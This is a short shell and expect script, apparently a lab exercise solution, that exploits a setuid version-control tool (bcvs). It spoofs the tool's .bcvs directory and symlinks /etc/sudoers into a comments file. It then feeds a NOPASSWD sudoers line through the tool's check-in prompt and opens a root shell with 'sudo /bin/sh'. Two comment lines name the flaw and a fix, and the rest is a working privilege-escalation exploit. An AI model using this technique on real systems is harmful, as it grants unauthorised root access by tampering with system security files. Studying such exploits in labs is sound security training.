#unique cuz it abuses lac of dir enforcement to spoof a dir
#fix would involve using an absolute (and protected) directory for .bcvs

cd ~
mkdir test
cd test
mkdir .bcvs
cd .bcvs
touch block.list
ln -s /etc/sudoers anything.txt.comments
cd ..

/usr/bin/expect -c '
sleep 0.5
cd ~/test
sleep 0.5
spawn /opt/bcvs/bcvs ci anything.txt
sleep 0.5
expect "Please write a SHORT explanation:\r"
sleep 0.5
send "student ALL=(ALL) NOPASSWD: ALL\n"
sleep 0.5
'
sudo /bin/sh
